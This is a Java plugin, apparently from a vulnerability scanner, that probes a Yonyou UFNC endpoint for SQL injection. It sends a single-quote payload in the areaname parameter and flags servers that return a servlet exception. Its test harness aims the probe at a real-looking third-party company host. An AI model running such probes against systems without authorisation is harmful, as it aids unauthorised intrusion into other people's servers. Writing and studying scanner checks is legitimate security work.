package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;

public class UFNCInjection3 implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "Ufnc SQL Injection3");
//		info.put("location", "/epp/html/nodes/upload/SupdocDo.jsp?areaname=1*&supdocname=1&pk_singleplan=1");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceType.toLowerCase().contains("http") )
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s//epp/html/nodes/upload/SupdocDo.jsp?areaname=1'&supdocname=1&pk_singleplan=1", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomAutoRedirectClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			if ( resp.getStatusLine().getStatusCode() == 404 )
			{
				success = false;
				return success;
			}
			String content = EntityUtils.toString(resp.getEntity());
			httpGet.releaseConnection();
			if(content.toLowerCase().contains("java") && content.toLowerCase().contains("javax.servlet.ServletException".toLowerCase()) && resp.getStatusLine().getStatusCode() == 500)
			{
				success = true;
			}
			
			
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "erp.suning.com.cn");
		infodict.put("port", "80");
		infodict.put("service_type", "http");
		infodict.put("service_version", "topsec");
		System.out.println(new UFNCInjection3().verify(infodict));
	}

}
